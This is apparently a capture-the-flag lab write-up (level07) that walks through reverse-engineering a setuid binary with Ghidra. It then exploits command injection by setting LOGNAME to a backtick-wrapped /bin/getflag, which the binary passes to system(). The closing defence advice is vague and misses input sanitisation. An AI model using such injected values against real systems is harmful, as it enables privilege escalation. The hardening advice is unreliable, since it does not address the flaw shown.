# Level07

### Tools


### How to solve it

1. After loging in using ssh in level07@(vmIP): 
```
ssh level07@000.000.000.000 -p 4242
```
2. When loging in we get this file:
```
level07
```
3. We use string level07 and we have some interest return:
```
/home/user/level07/level07.c -> But the file is not there
/bin/echo %s -> Indicates that this path from echo function may be exploited
system, getenv, and setresgid/setresuid -> system calls 
LOGNAME -> Probably ENV variable 

```
4. We have this information but after trying many things we get to nowhere, after that we go further and try to use Ghidra. Ghidra is a tool to analyse files and do reverse engineering. In this case after analyzing it we find the level07.c source and we decompile it and we get: 
```
int main(int argc,char **argv,char **envp)
{
  char *param2;
  int iVar1;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  param2 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",param2);
  iVar1 = system(local_1c);
  return iVar1;
}
```
5. If we type env we also get some info and one is : 
```
LOGNAME=level07

```
5. Analyzing it we so have the information that the LOGNAME could be substituted by our getflag command to be executed along with level07 executable.
```
LOGNAME='`/bin/getflag`'
./level07

```
7. And Boom:
```
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
### How to protect
 - Once someone is inside your system and if you do not monitor it it's because you failed before,  one additional protection in this case would be protecting with passwords all executables that has ENV variables.

